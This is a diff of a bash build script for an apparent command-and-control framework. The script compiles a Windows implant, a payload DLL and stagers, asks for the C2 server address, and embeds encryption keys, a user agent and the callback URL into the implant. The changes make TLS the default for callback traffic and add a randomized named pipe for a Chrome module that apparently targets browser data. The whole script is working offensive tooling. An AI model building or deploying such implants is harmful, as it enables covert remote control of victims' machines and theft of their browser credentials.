@@ -8,6 +8,9 @@ mkdir -p build/payloads
 ENCRYPTION_KEY=$(openssl rand -hex 32)
 echo "[*] generated encryption key: ${ENCRYPTION_KEY}"
 
+CHROME_PIPE_NAME="\\\\.\\pipe\\$(openssl rand -hex 8)"
+echo "[*] generated chrome pipe name: ${CHROME_PIPE_NAME}"
+
 echo ""
 echo "[*] configuring C2 server connection..."
 read -p "    Enter C2 server IP [127.0.0.1]: " STAGER_HOST
@@ -16,12 +19,14 @@ STAGER_HOST="${STAGER_HOST:-127.0.0.1}"
 read -p "    Enter C2 listener port (only change if u want) [8443]: " STAGER_PORT
 STAGER_PORT="${STAGER_PORT:-8443}"
 
-read -p "    Enable TLS? [y/N]: " ENABLE_TLS
-ENABLE_TLS="${ENABLE_TLS:-n}"
+read -p "    Enable TLS? [Y/n]: " ENABLE_TLS
+ENABLE_TLS="${ENABLE_TLS:-y}"
 
-USE_TLS=false
-if [[ "$ENABLE_TLS" =~ ^[Yy]$ ]]; then
-    USE_TLS=true
+USE_TLS=true
+if [[ "$ENABLE_TLS" =~ ^[Nn]$ ]]; then
+    USE_TLS=false
+    SERVER_URL="http://${STAGER_HOST}:${STAGER_PORT}/"
+else
     SERVER_URL="https://${STAGER_HOST}:${STAGER_PORT}/"
     if [[ "$STAGER_HOST" == "127.0.0.1" || "$STAGER_HOST" == "localhost" ]]; then
         echo "[*] generating self-signed TLS certificates (localhost)..."
@@ -34,15 +39,13 @@ if [[ "$ENABLE_TLS" =~ ^[Yy]$ ]]; then
     MSYS_NO_PATHCONV=1 openssl req -x509 -newkey rsa:2048 -keyout build/server.key -out build/server.crt \
         -days 365 -nodes -subj "/CN=${STAGER_HOST}"
     echo "[+] TLS configuration complete"
-else
-    SERVER_URL="http://${STAGER_HOST}:${STAGER_PORT}/"
 fi
 echo "[*] implant will connect to: ${SERVER_URL}"
 echo ""
 
 echo "[*] building gobound.dll..."
 cd gobound/dll
-GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags="-s -w" -trimpath -o ../../build/payloads/gobound.dll
+GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags="-s -w -X main.pipeName=${CHROME_PIPE_NAME}" -trimpath -o ../../build/payloads/gobound.dll
 cd ../..
 
 echo "[*] building server..."
@@ -62,7 +65,7 @@ echo "    Generated User Agent: ${USER_AGENT}"
 
 echo "[*] building implant..."
 cd implant/cmd
-GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -X main.EncryptionKey=${ENCRYPTION_KEY} -X \"main.UserAgent=${USER_AGENT}\" -X main.ServerURL=${SERVER_URL}" -trimpath -o ../../build/implant.exe
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -X main.EncryptionKey=${ENCRYPTION_KEY} -X \"main.UserAgent=${USER_AGENT}\" -X main.ServerURL=${SERVER_URL} -X \"github.com/carved4/carved/implant/pkg/modules/chrome.pipeName=${CHROME_PIPE_NAME}\"" -trimpath -o ../../build/implant.exe
 cd ../..
 cp build/implant.exe build/payloads/implant.exe
 echo "[*] building stagers..."
